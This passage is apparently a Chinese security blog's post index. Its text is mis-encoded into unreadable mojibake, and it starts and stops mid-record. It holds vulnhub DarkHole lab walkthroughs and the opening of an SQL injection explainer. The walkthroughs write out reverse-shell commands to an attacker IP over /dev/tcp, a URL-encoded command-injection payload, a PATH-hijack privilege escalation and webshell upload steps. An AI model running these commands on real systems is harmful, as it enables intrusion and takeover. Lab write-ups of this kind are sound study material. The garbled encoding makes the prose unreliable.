ä¸ºä»»æ„é‚®ç®±,123@123.com\nå‘ç°å­˜åœ¨ä¸€ä¸ªhtmlæ–‡ä»¶ä¸‹è½½ä¸‹æ¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271932686.png)\n\næ‰“å¼€,æŸ¥çœ‹æºä»£ç ,titleæœ‰ä¸€ä¸²å¯ç–‘å­—ç¬¦,å’Œä¸€å¥æç¤º\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271934487.png)\n\næ²¡æœ‰åˆ©ç”¨çš„ç‚¹,å›åˆ°ç½‘ç«™,æ‰«ä¸€ä¸‹ç›®å½•,æ‰«åˆ°ä¸€ä¸ªfiles\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271938467.png)\n\næ‰“å¼€å‘ç°ä¸€ä¸ªCALL.html,å’Œftpä¸Šçš„ä¸€æ¨¡ä¸€æ ·\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271939684.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271939512.png)\n\nçŒœæµ‹ftpç›®å½•å’Œwebç›®å½•ä¸ºåŒä¸€ä¸ª,åˆ©ç”¨ftpä¸Šä¼ webshellè¯•è¯•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271941357.png)\n\nè®¿é—®å­˜åœ¨,ä¸Šèšå‰‘\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271944032.png)\n\n## ææƒ\nç”¨èšå‰‘åå¼¹ä¸€ä¸ªshellåˆ°kali\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271947654.png)\n\nç¿»å®¶ç›®å½•,ç¿»åˆ°ä¸€ä¸ªtxt,æç¤ºæˆ‘ä»¬è¿è¡Œä¸€ä¸ªshè„šæœ¬,è¿è¡Œä¹‹åå‡ºæ¥ä¸€ä¸²å¯†æ–‡\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271949779.png)\n\nå°è¯•è§£å¯†onion,åº”è¯¥æ˜¯shrekçš„å¯†ç ,å’Œæœ€å¼€å§‹çš„htmlæ ‡é¢˜ä¸€æ ·...\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271950204.png)\n\nsshç™»å½•ä¸Šæ¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271953098.png)\n\næŸ¥çœ‹æ‹¥æœ‰sudoæƒé™çš„æ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271954027.png)\n\næœ‰python,ç›´æ¥å†™shell\n![](https://raw.githubusercontent.com/chencicici/images/main/202206271958787.png)\n\n","tags":["vulnhub","ftp"],"categories":["æ‰“é¶"]},{"title":"vulnhub-darkhole:2æ‰“é¶","url":"/2022/06/25/vulnhub-darkhole-2æ‰“é¶/","content":"# ç¯å¢ƒ\nvulnhubé¡¹ç›® https://www.vulnhub.com/entry/darkhole-2,740/\né¶æœº:172.16.17.154\næ”»å‡»æœºkali:172.16.17.140\n\n# ä¿¡æ¯æ”¶é›†\nnmap æ‰«æé¶æœº\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252101537.png)\n\nè®¿é—®ä¸€ä¸‹é¦–é¡µ,çœ‹çœ‹webæŒ‡çº¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252102462.png)\n\né¦–é¡µåªæœ‰ä¸€ä¸ªç™»å½•åŠŸèƒ½, nmapæ‰«åˆ°ä¸€ä¸ª.gitç›®å½•,ç»§ç»­æ‰«ä¸€ä¸‹ç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252103052.png)\n\nconfigå’Œ.gitæŒ¨ä¸ªè®¿é—®,éƒ½å­˜åœ¨ç›®å½•éå†å’Œgitæ³„éœ²\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252104899.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252108851.png)\n\nä¿¡æ¯æ”¶é›†åˆ°æ­¤ç»“æŸ\n\n\n# Exploit\n## è·å–gitæºç \nè„šæœ¬åœ°å€ https://github.com/lijiejie/GitHack/\n\nç”¨è„šæœ¬ä¸‹è½½æºç \n```bash\npython GitHack.py http://172.16.17.154/.git/\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252140311.png)\n\n\næŸ¥çœ‹ä¸€ä¸‹ç›®å½•ç»“æ„\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252141979.png)\n\nå¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ,ä½†æ˜¯å¹¶æœªå¯¹å¤–å¼€æ”¾æ•°æ®åº“ç«¯å£\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252142189.png)\n\nå®¡è®¡å‡ ä¸ªphpæ–‡ä»¶,æ²¡æœ‰æ”¶è·\n\n## git log\né€’å½’ä¸‹è½½ç›®å½•\nè„šæœ¬åœ°å€ https://github.com/arthaud/git-dumper\n```bash\npython git_dumper.py http://172.16.17.154/.git website\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252152596.png)\n\nå®¡è®¡æ—¥å¿—\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252154557.png)\n\nç¬¬ä¸€æ¬¡ä¸ºåˆå§‹åŒ–,ç¬¬äºŒæ¬¡added login.php,ç¬¬ä¸‰æ¬¡changed login.php\n\nç¬¬äºŒæ¬¡æ·»åŠ äº†é»˜è®¤å‡­æ®\n\n     I added login.php file with default credentials\n\nç»§ç»­è·Ÿè¿›,æŸ¥çœ‹ä¸¤æ¬¡çš„å·®å¼‚\n```bash\ngit diff a4d900a8d85e8938d3601f3cef113ee293028e10\n```\næ‹¿åˆ°è´¦å·å¯†ç ,åŒæ—¶çœ‹åˆ°sqlè¯­å¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252207747.png)\n\n## sqlæ³¨å…¥\nç™»å½•æˆåŠŸ,çœ‹åˆ°idå­—çœ¼,ç»“åˆä¸Šé¢çœ‹åˆ°çš„sqlè¯­å¥,æ­¤å¤„å­˜åœ¨sqlæ³¨å…¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252209727.png)\n\nä¿®æ”¹idä¸º0æ—¶,å†…å®¹æ¶ˆå¤±\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252213507.png)\n\n1=1å›æ˜¾æ­£å¸¸\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252217059.png)\n\n1=2æ— å›æ˜¾\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252217080.png)\n\nä¸¢sqlmapè·‘,éœ€è¦å¸¦ä¸Šcookie\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252223888.png)\n\nåœ¨æ•°æ®åº“ä¸­è·‘å‡ºsshå¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206252229820.png)\n\n## ææƒ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252231283.png)\n\næ‹¿åˆ°ç¬¬ä¸€ä¸ªflag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252232348.png)\n\nææƒä¿¡æ¯æ”¶é›†\nsudo -læ²¡æœ‰\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252234087.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252234966.png)\n\nåœ¨å†å²å‘½ä»¤ç¿»åˆ°å¯ç–‘è®°å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252236595.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252236339.png)\n\n```bash\ncurl \"http://localhost:999/?cmd=id\" \ncurl \"http://localhost:9999/?cmd=id\"\ncurl \"http://127.0.0.1:9999/?cmd=ls -la\"\ncurl \"http://127.0.0.1:9999/?cmd=ls%20-la\"\ncurl \"http://127.0.0.1:9999/?cmd=cd%20~&ls\"\ncurl \"http://127.0.0.1:9999/?cmd=cd%20~&&ls\"\ncurl \"http://127.0.0.1:9999/?cmd=cd%20~||ls\"\n\n```\nçœ‹æ¥å­˜åœ¨å‘½ä»¤æ‰§è¡Œ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252238693.png)\n\nå‘ç°,æ˜¯losyç”¨æˆ·,åå¼¹ä¸€ä¸ªshell,éœ€è¦æ³¨æ„çš„æ˜¯,å› ä¸ºæ˜¯urlæ‰§è¡Œ,æ‰€ä»¥éœ€è¦urlç¼–ç \n```bash\ncurl \"http://127.0.0.1:9999/?cmd=bash%20-c%20'exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F172.16.17.140%2F4444%20%3C%261'\"\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252251755.png)\n\nå†å²å‘½ä»¤çœ‹åˆ°å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206252250920.png)\n\nsshä¸Šlosyç”¨æˆ·æŸ¥çœ‹sudoæƒé™çš„æ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252252937.png)\n\næ ¹æ®å†å²å‘½ä»¤çš„æç¤º,ç”¨pythonæ‹¿åˆ°ä¸€ä¸ªshell\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252255400.png)\n\næ‹¿åˆ°æœ€åçš„flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206252256615.png)","tags":["vulnhub","ä¿¡æ¯æ³„éœ²"],"categories":["æ‰“é¶"]},{"title":"vulnhub-darkhole:1æ‰“é¶","url":"/2022/06/24/vulnhub-darkhole:1æ‰“é¶/","content":"# ç¯å¢ƒ\nvulnhubé¡¹ç›® https://www.vulnhub.com/entry/darkhole-1,724/\né¶æœº:172.16.17.153\næ”»å‡»æœºkali:172.16.17.140\n\n# ä¿¡æ¯æ”¶é›†\nnmapæ‰«ä¸€ä¸‹ \n![](https://raw.githubusercontent.com/chencicici/images/main/202206241816412.png)\n\næ’ä»¶çœ‹åˆ°webæŒ‡çº¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242200037.png)\n\n\næ‰«ä¸€ä¸‹ç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241829627.png)\n\nconfigç›®å½•å­˜åœ¨ç›®å½•éå†,ä¸‹è½½ä¸ä¸‹æ¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241830409.png)\n\n# Exploit\n## å‚ç›´è¶Šæƒ\næ³¨å†Œä¸€ä¸ªè´¦å·çœ‹çœ‹,åœ¨æ³¨å†Œçš„æ—¶å€™,ç”¨æˆ·åä½¿ç”¨admin,æŠ¥ç”¨æˆ·æˆ–è€…é‚®ç®±å­˜åœ¨,åº”è¯¥å­˜åœ¨ä¸€ä¸ªadminè´¦å·,ç»§ç»­å¾€ä¸‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241827069.png)\n\nç™»å½•è¿›å»,å‘ç°å¯ä»¥ä¿®æ”¹å¯†ç ,åŒæ—¶urlå¤„çœ‹åˆ°id=2\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242147073.png)\n\nä¿®æ”¹idä¸º1,æç¤ºæ²¡æœ‰æƒé™,é‚£ä¹ˆæ­¤å¤„åº”è¯¥å­˜åœ¨è¶Šæƒ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242148896.png)\n\næŠ“åŒ…ä¿®æ”¹å¯†ç çš„æ•°æ®åŒ…\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242151674.png)\n\nä¿®æ”¹idå‚æ•°\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242153137.png)\n\né€€å‡ºtestè´¦å·,ä½¿ç”¨adminç™»å½•,ç™»å½•æˆåŠŸ,å‡ºç°ä¸€ä¸ªä¸Šä¼ ç‚¹ \n![](https://raw.githubusercontent.com/chencicici/images/main/202206242155345.png)\n\n## ä¸Šä¼ webshell\nä¸Šä¼ ä¸€å¥è¯å‘ç°æœ‰é™åˆ¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242158827.png)\n\nä¼ ä¸€ä¸ª.php3åç¼€çš„è¯•è¯•,å‘ç°å¯ä»¥ä¸Šä¼ ,è™½ç„¶ä¸è¢«è§£æ,ä½†èµ·ç è¯´æ˜å¹¶ä¸æ˜¯ç™½åå•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242156017.png)\n\nå‰é¢å¾—åˆ°æœåŠ¡å™¨ä¸ºapache,å°è¯•apacheè§£ææ¼æ´,æŠ“åŒ…æ…¢æ…¢fuzz\næœ€åä½¿ç”¨.phtmlæˆåŠŸç»•è¿‡,[ä¸­é—´ä»¶è§£ææ¼æ´](https://syst1m.top/2022/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242215173.png)\n\nçœ‹ä¸€ä¸‹æœ€å¼€å§‹ä¿¡æ¯æ”¶é›†çš„é‚£ä¸ªdatabase.php,å¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206242227736.png)\n## ææƒ\nèšå‰‘åå¼¹ä¸€ä¸ªäº¤äº’å¼shellåˆ°kali\n```bash\nbash -c 'exec bash -i &>/dev/tcp/172.16.17.140/4444 <&1'\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242219996.png)\n\nåœ¨å®¶ç›®å½•ä¸‹ç¿»åˆ°ä¸€ä¸ªjohnç”¨æˆ·,å­˜åœ¨rootæƒé™çš„æ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242229612.png)\n\nè¿è¡Œå‘ç°æ˜¯ä»¥johnç”¨æˆ·æ‰§è¡Œäº†idå‘½ä»¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242230601.png)\n\næ€è·¯:æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ ä¸€ä¸ªidå‘½ä»¤å†™å…¥shell,æ›¿æ¢æ‰åŸæ¥çš„ç¯å¢ƒå˜é‡åˆ°è¿™æˆ‘ä»¬æ„é€ çš„idå‘½ä»¤ä¸‹\n```bash\necho '/bin/bash' > /tmp/id; chmod +x /tmp/id; export PATH=/tmp:$PATH\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242235087.png)\n\nåœ¨johnå®¶ç›®å½•ä¸‹å¾—åˆ°flagå’Œjohnçš„å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206242243076.png)\n\nsshå¾—åˆ°ä¸€ä¸ªå®Œå…¨äº¤äº’å¼shell\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242244133.png)\n\nçœ‹ä¸€ä¸‹sudoæ‰§è¡Œçš„æ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242252290.png)\n\nå†™å…¥åå¼¹shellçš„pythonè¯­å¥\nè¿™é‡Œè¦æ³¨æ„,è¦ä½¿ç”¨ç»å¯¹è·¯å¾„å»æ‰§è¡Œfile.py,å¦åˆ™ä¼šæŠ¥æƒé™ä¸å¤Ÿ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206242253772.png)","tags":["vulnhub","è¶Šæƒ"],"categories":["æ‰“é¶"]},{"title":"sqlæ³¨å…¥ä¹‹mysqlæ³¨å…¥å§¿åŠ¿åŠç»•è¿‡æ€»ç»“","url":"/2022/06/24/sqlæ³¨å…¥ä¹‹mysqlæ³¨å…¥å§¿åŠ¿åŠç»•è¿‡æ€»ç»“/","content":"# SQLæ³¨å…¥æ¼æ´\n\n## èƒŒæ™¯\néšç€äº’è”ç½‘webå’Œä¿¡æ¯æŠ€æœ¯çš„å‘å±•ï¼Œåœ¨webåç«¯ä½œä¸ºå­˜å‚¨å’Œç®¡ç†çš„çš„æ•°æ®åº“ä¹Ÿå¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨ï¼Œä¸webç»“åˆè¾ƒä¸ºç´§å¯†çš„æ•°æ®åº“åŒ…æ‹¬Mysqlï¼ŒSqlserverï¼ŒOracleï¼ŒSqlliteï¼ŒDb2ï¼ŒAccessç­‰ç­‰ã€‚ æ•°æ®å­˜å‚¨å’Œç®¡ç†ä½œä¸ºåº”ç”¨çš„ä¸€ä¸ªåŸºæœ¬éœ€æ±‚ï¼Œåœ¨ç»å¤§å¤šæ•°çš„åº”ç”¨é‡Œéƒ½å¾—åˆ°äº†ä½¿ç”¨ï¼Œè¿™ç§å¤§é¢ç§¯çš„ä½¿ç”¨ä¹Ÿæ„å‘³ç€åœ¨æ•°æ®åº“æ“ä½œæ–¹é¢å¦‚æœå¤„ç†ä¸å½“å‡ºç°é—®é¢˜çš„å¯èƒ½æ€§ä¼šå¾ˆå¤§ï¼Œå¦å¤–ä¸€æ–¹é¢ç”±äºæ•°æ®åº“æ‰¿è½½äº†åº”ç”¨çš„æ•°æ®ä¿¡æ¯ï¼Œå¦‚æœæ•°æ®åº“å‡ºç°é—®é¢˜ä¸€æ–¹é¢å¯èƒ½å¯¼è‡´æ•æ„Ÿæ•°æ®çš„æ³„éœ²å’Œç¯¡æ”¹ï¼ˆå¦‚ä¿¡ç”¨å¡è´¦æˆ·ï¼Œç”¨æˆ·å¯†ç ï¼Œç®¡ç†è´¦æˆ·å’Œå¯†ç ï¼Œé”€å”®è®°å½•ç­‰ç­‰ï¼‰ï¼Œç›´æ¥å¯¼è‡´æŸå¤±å’Œåº”ç”¨è¢«æ”»é™·ï¼Œå¦å¤–ä¸€æ–¹é¢ï¼Œå³ä½¿æ•°æ®åº“ä¸­ä¸æ‰¿è½½è¾ƒä¸ºæ•æ„Ÿçš„ä¿¡æ¯ï¼Œç”±äºæ•°æ®åº“çš„ç‰¹æ®Šæ€§ï¼Œæ•°æ®åº“è¢«æ”»å‡»çš„è¯ä¹Ÿå¯ä»¥ç›´æ¥å¯¼è‡´åº”ç”¨ç¨‹åºå´©æºƒåŠå…¶ä»–ä¸¥é‡çš„åæœã€‚\n\n## æ¼æ´æˆå› \nåº”ç”¨ä¸ºäº†å’Œæ•°æ®åº“è¿›è¡Œæ²Ÿé€šå®Œæˆå¿…è¦çš„ç®¡ç†å’Œå­˜å‚¨å·¥ä½œï¼Œå¿…é¡»å’Œæ•°æ®åº“ä¿ç•™ä¸€ç§æ¥å£ã€‚ç›®å‰çš„æ•°æ®åº“ä¸€èˆ¬éƒ½æ˜¯æä¾›apiä»¥æ”¯æŒç®¡ç†ï¼Œåº”ç”¨ä½¿ç”¨åº•å±‚å¼€å‘è¯­è¨€å¦‚Phpï¼ŒJavaï¼Œaspï¼ŒPythonä¸è¿™äº›apiè¿›è¡Œé€šè®¯ã€‚å¯¹äºæ•°æ®åº“çš„æ“ä½œï¼Œç›®å‰æ™®éä½¿ç”¨ä¸€ç§SQLè¯­è¨€ï¼ˆStructured Query Languageè¯­è¨€ï¼ŒSQLè¯­è¨€çš„åŠŸèƒ½åŒ…æ‹¬å¢åˆ æŸ¥æ”¹ç­‰ï¼Œæ˜¯ä¸€ä¸ªç»¼åˆçš„ã€é€šç”¨çš„å…³ç³»æ•°æ®åº“è¯­è¨€ï¼ŒåŒæ—¶åˆæ˜¯ä¸€ç§é«˜åº¦éè¿‡ç¨‹åŒ–çš„è¯­è¨€ï¼Œåªè¦æ±‚ç”¨æˆ·æŒ‡å‡ºåšä»€ä¹ˆè€Œä¸éœ€è¦æŒ‡å‡ºæ€ä¹ˆåšï¼‰ï¼ŒSQLä½œä¸ºå­—ç¬¦ä¸²é€šè¿‡APIä¼ å…¥ç»™æ•°æ®åº“ï¼Œæ•°æ®åº“å°†æŸ¥è¯¢çš„ç»“æœè¿”å›ï¼Œæ•°æ®åº“è‡ªèº«æ˜¯æ— æ³•åˆ†è¾¨ä¼ å…¥çš„SQLæ˜¯åˆæ³•çš„è¿˜æ˜¯ä¸åˆæ³•çš„ï¼Œå®ƒå®Œå…¨ä¿¡ä»»ä¼ å…¥çš„æ•°æ®ï¼Œå¦‚æœä¼ å…¥çš„SQLè¯­å¥è¢«æ¶æ„ç”¨æˆ·æ§åˆ¶æˆ–è€…ç¯¡æ”¹ï¼Œå°†å¯¼è‡´æ•°æ®åº“ä»¥å½“å‰è°ƒç”¨è€…çš„èº«ä»½æ‰§è¡Œé¢„æœŸä¹‹å¤–çš„å‘½ä»¤å¹¶ä¸”è¿”å›ç»“æœï¼Œå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚ é‚£ä¹ˆæ¶æ„ç”¨æˆ·å¦‚ä½•æ‰èƒ½æ§åˆ¶ä¼ å…¥çš„SQLè¯­å¥å‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œæ—¢ç„¶ä¼ å…¥çš„SQLæ˜¯ä»¥å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ å…¥çš„ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ç”±åº”ç”¨ç”Ÿæˆï¼Œé‚£ä¹ˆå¦‚æœåº”ç”¨ç”Ÿæˆè¿™ä¸ªå­—ç¬¦ä¸²çš„æ–¹å¼ä¸å¯¹å°±å¯èƒ½å¯¼è‡´é—®é¢˜ï¼Œè­¬å¦‚è€ƒè™‘å¦‚ä¸‹çš„åŠŸèƒ½ï¼š\n\n```php\n$sql=\"select * from members where userid=\".$_GET[userid];\n\n$sb->query($sql);\n```\n\nè¿™æ®µä»£ç çš„é€»è¾‘æ˜¯æ ¹æ®ç”¨æˆ·è¯·æ±‚çš„Useridè¿›å…¥æ•°æ®åº“æŸ¥è¯¢å‡ºä¸åŒçš„ç”¨æˆ·å¹¶ä¸”è¿”å›ç»™ç”¨æˆ·ï¼Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆä¼ å…¥çš„å­—ç¬¦ä¸²æœ‰ä¸€éƒ¨åˆ†æ˜¯æ ¹æ®ç”¨æˆ·çš„è¾“å…¥æ¥æ§åˆ¶çš„ï¼Œä¸€æ—¦ç”¨æˆ·æäº¤`poc.php?userid=1 or 1=1`æœ€ç»ˆè¿›å…¥ç¨‹åºä¹‹åä¼ å…¥æ•°æ®åº“çš„é€»è¾‘å°†æ˜¯\n\n```php\n$sb->query(\"select * from members where userid=1 or 1=1\");\n```\n\nç”¨æˆ·å®Œå…¨å¯ä»¥æ ¹æ®ä¼ å…¥çš„å†…å®¹æ¥æ§åˆ¶æ•´ä¸ªSQLçš„é€»è¾‘ï¼Œå®ç°é—´æ¥æ§åˆ¶å’Œç®¡ç†æ•°æ®åº“çš„ç›®çš„ï¼Œ`è¿™ç§å‘½ä»¤ï¼ˆSQLè¯­å¥ï¼‰å’Œæ•°æ®ï¼ˆç”¨æˆ·æäº¤çš„æŸ¥è¯¢ï¼‰ä¸åˆ†å¼€çš„å®ç°æ–¹å¼å¯¼è‡´äº†å®‰å…¨æ¼æ´çš„äº§ç”Ÿã€‚` ç”±äºä¸åŒçš„å¼€å‘è¯­è¨€å¯èƒ½å¯¹apiè¿›è¡Œäº†ä¸åŒçš„å°è£…ï¼Œå¹¶ä¸”å„ç§è¯­è¨€å†…éƒ¨å¯¹æ•°æ®çš„æ ¡éªŒä¼šæœ‰ä¸åŒçš„è¦æ±‚ï¼Œè­¬å¦‚javaå’Œpythonå±äºå˜é‡å¼ºç±»å‹å¹¶ä¸”å„ç§å¼€å‘æ¡†æ¶çš„æµè¡Œå¯¼è‡´å‡ºç°SQLæ³¨å°„çš„å‡ ç‡è¾ƒå°ï¼Œphpå±äºå¼±ç±»å‹ä¸ä¼šå¯¹æ•°æ®è¿›è¡Œå¼ºåˆ¶çš„éªŒè¯åŠ ä¸Šè¿‡ç¨‹åŒ–çš„ç¨‹åºç¼–å†™æ€è·¯å¯¼è‡´å‡ºç°æ³¨å°„çš„å‡ ç‡ä¼šè¾ƒå¤§ã€‚\n\n## æ”»å‡»æ–¹å¼\né€šè¿‡å…¸å‹çš„SQLæ³¨å°„æ¼æ´ï¼Œé»‘å®¢æ˜¯å¯ä»¥æ ¹æ®æ‰€èƒ½æ§åˆ¶çš„å†…å®¹åœ¨SQLè¯­å¥çš„ä¸Šä¸‹æ–‡å¯¼è‡´ä¸åŒçš„ç»“æœçš„ï¼Œè¿™ç§ä¸åŒä¸»è¦ä½“ç°åœ¨ä¸åŒçš„`æ•°æ®åº“ç‰¹æ€§ä¸Šå’Œç»†èŠ‚ä¸Š`ã€‚åŒæ—¶ï¼Œåç«¯çš„æ•°æ®åº“çš„ä¸åŒå¯¼è‡´é»‘å®¢èƒ½åˆ©ç”¨SQLè¯­å¥è¿›è¡Œçš„æ“ä½œä¹Ÿå¹¶ä¸ç›¸åŒï¼Œå› ä¸ºå¾ˆå¤šçš„æ•°æ®åº“åœ¨æ ‡å‡†çš„SQLä¹‹å¤–ä¹Ÿä¼šå®ç°ä¸€äº›è‡ªèº«æ¯”è¾ƒç‰¹åˆ«çš„åŠŸèƒ½å’Œæ‰©å±•ï¼Œ`å¸¸è§çš„æœ‰Sqlserverçš„å¤šè¯­å¥æŸ¥è¯¢ï¼ŒMysqlçš„é«˜æƒé™å¯ä»¥è¯»å†™ç³»ç»Ÿæ–‡ä»¶ï¼ŒOracleç»å¸¸å‡ºç°çš„ä¸€äº›ç³»ç»ŸåŒ…ææƒæ¼æ´ã€‚` å³ä½¿ä¸€äº›SQLæ³¨å°„æœ¬èº«æ— æ³•å¯¹æ•°æ®æœ¬èº«è¿›è¡Œä¸€äº›é«˜çº§åˆ«çš„å±å®³ï¼Œè­¬å¦‚ä¸€äº›æ•°æ®åº“é‡Œå¯èƒ½æ²¡æœ‰å­˜å‚¨ç§å¯†ä¿¡æ¯ï¼Œåˆ©ç”¨SQLæŸ¥è¯¢çš„ç»“æœä¸€æ ·å¯èƒ½å¯¹åº”ç”¨é€ æˆå·¨å¤§çš„ç¾éš¾ï¼Œå› ä¸ºåº”ç”¨å¯èƒ½å°†ä»æ•°æ®åº“é‡Œæå–çš„ä¿¡æ¯åšä¸€äº›å…¶ä»–çš„æ¯”è¾ƒé«˜å±é™©çš„åŠ¨ä½œï¼Œè­¬å¦‚è¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œè¿™ç§æœ¬èº«æ— ä»·å€¼çš„æ•°æ®å’ŒæŸ¥è¯¢ä¸€æ—¦è¢«åº”ç”¨æœ¬èº«èµ‹äºˆè¾ƒé«˜çš„æ„ä¹‰çš„è¯ï¼Œå¯èƒ½ä¸€æ ·å¯¼è‡´å¾ˆé«˜çš„å±å®³ã€‚ è¯„ä¼°ä¸€ä¸ªSQLæ³¨å°„çš„å±å®³éœ€è¦å–å†³äºæ³¨å°„ç‚¹å‘ç”Ÿçš„SQLè¯­å¥çš„ä¸Šä¸‹æ–‡ï¼ŒSQLè¯­å¥åœ¨åº”ç”¨çš„ä¸Šä¸‹æ–‡ï¼Œåº”ç”¨åœ¨æ•°æ®åº“çš„ä¸Šä¸‹æ–‡ï¼Œç»¼åˆè€ƒè™‘è¿™äº›å› ç´ æ¥è¯„ä¼°ä¸€ä¸ªSQLæ³¨å°„çš„å½±å“ï¼Œåœ¨æ— ä¸Šè¿°åˆ©ç”¨ç»“æœçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡webåº”ç”¨å‘æ•°æ®åº“ä¼ é€’ä¸€äº›èµ„æºè¦æ±‚æé«˜çš„æŸ¥è¯¢å°†å¯¼è‡´æ•°æ®åº“çš„æ‹’ç»æœåŠ¡ï¼Œè¿™å°†æ˜¯é»‘å®¢å¯èƒ½èƒ½è¿›è¡Œçš„æœ€åçš„åˆ©ç”¨ã€‚\n\n## ä¿®å¤æ–¹æ¡ˆ\næ¯”è¾ƒä¼ ç»Ÿçš„ä¿®å¤æ–¹å¼ä¸€èˆ¬è®¤ä¸ºæ˜¯å¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œä½†æ˜¯ç”±äºè¾“å…¥çš„æ¥æºå¤ªè¿‡å¹¿æ³›ï¼Œå¯èƒ½æ¥è‡ªäºæ•°æ®åº“ï¼ŒHTTPè¯·æ±‚ï¼Œæ–‡ä»¶æˆ–è€…å…¶ä»–çš„æ•°æ®æ¥æºï¼Œè¾ƒéš¾å¯¹æ‰€æœ‰è¿›å…¥çš„æ•°æ®åœ¨å„ç§åœºæ™¯ä¸‹è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ã€‚ äº‹å®ä¸Šæœ€ç½ªæ¶çš„ä¸æ˜¯æ•°æ®ï¼Œè€Œæ˜¯æˆ‘ä»¬ä½¿ç”¨æ•°æ®çš„æ–¹å¼ï¼Œæœ€ä¸ºå½»åº•çš„ä¿®å¤ä¸€å®šè¦æŸ¥æ‰¾æœ€ä¸ºå½»åº•çš„æ ¹æºï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ€åçš„æ ¹æºåœ¨äºå¯¹æ•°æ®å’ŒæŒ‡ä»¤çš„ä¸åˆ†ç¦»ï¼Œæ‰€ä»¥åœ¨ä¿®å¤çš„æ—¶å€™åº”è¯¥æåŠ›å°†æ•°æ®å’ŒæŒ‡ä»¤åˆ†ç¦»ã€‚ç›®å‰è¾ƒä¸ºæå€¡çš„ï¼ŒåŒæ—¶åœ¨å„ç§æ•°æ®åº“æ“ä½œæ¡†æ¶é‡Œä½“ç°çš„æ–¹å¼å°±æ˜¯ä»¥å¡«å……æ¨¡æ¿çš„æ–¹å¼æ¥ä»£æ›¿ä¼ ç»Ÿçš„æ‹¼æ¥çš„æ–¹å¼è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œè­¬å¦‚ï¼š\n```php\n$SqlTemplate=\"select * from members where 